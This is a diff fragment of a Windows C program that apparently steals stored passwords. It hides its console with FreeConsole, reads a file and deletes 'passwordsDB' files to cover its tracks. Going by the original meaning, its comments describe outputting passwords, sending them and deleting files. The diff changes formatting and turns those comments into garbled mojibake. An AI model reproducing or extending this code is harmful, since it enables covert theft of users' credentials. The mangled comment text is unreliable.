@@ -1,5 +1,5 @@
-#include<stdio.h>
-#include<direct.h>
+#include <stdio.h>
+#include <direct.h>
 #include <windows.h>
 #include <pthread.h>
 #include <unistd.h>
@@ -16,7 +16,7 @@ void* child();
 int main()
 {
     FreeConsole();
-    //¿é¥X±K½X
+    //Â¿Ã©Â¥XÂ±KÂ½X
     pthread_t one;
     pthread_create(&one, NULL, child, NULL);
     sleep(50);
@@ -51,7 +51,7 @@ int main()
     FILE *fptr;
     fptr = fopen(b3, "r");
 
-    //¶Ç°e
+    //Â¶Ã‡Â°e
     if(fptr != NULL)
         {
             wchar_t ch[1024];
@@ -62,7 +62,7 @@ int main()
                 }
         }
 
-    //§R°£¤å¥ó
+    //Â§RÂ°Â£Â¤Ã¥Â¥Ã³
     remove ("passwordsDB");
     remove ("file\\passwordsDB");
     remove ("file\\a");
